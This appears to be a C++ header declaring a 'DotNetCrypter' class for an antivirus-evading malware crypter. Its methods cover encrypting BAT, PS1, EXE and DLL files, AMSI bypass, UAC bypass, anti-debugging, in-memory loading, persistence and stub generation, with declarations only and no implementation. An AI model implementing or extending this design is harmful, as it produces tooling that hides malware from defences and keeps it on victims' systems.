#pragma once
#include <string>
#include <vector>
#include <map>

class DotNetCrypter {
private:
    std::map<std::string, std::string> options;
    
public:
    DotNetCrypter();
    ~DotNetCrypter();
    
    // Core .NET crypting functionality
    bool cryptBATFile(const std::string& inputPath, const std::string& outputPath);
    bool cryptPS1File(const std::string& inputPath, const std::string& outputPath);
    bool cryptEXEFile(const std::string& inputPath, const std::string& outputPath);
    bool cryptDLLFile(const std::string& inputPath, const std::string& outputPath);
    
    // Advanced features
    bool addAntiDebugging();
    bool addAMSIBypass();
    bool addMemoryLoading();
    bool addStringEncryption();
    bool addRuntimeObfuscation();
    bool addAssemblyProtection();
    bool addPersistence();
    bool addUACBypass();
    
    // .NET Framework support
    bool supportDotNetFramework(const std::string& version);
    bool supportDotNetCore(const std::string& version);
    bool supportDotNet5Plus(const std::string& version);
    
    // Configuration
    void setOption(const std::string& key, const std::string& value);
    std::string getOption(const std::string& key) const;
    
    // Utility methods
    std::string generateDotNetStub();
    std::string obfuscateStrings(const std::string& code);
    std::string encryptAssembly(const std::string& assembly);
    std::string addPersistenceCode();
    
    // Menu interface
    void showMenu();
    void execute();
};
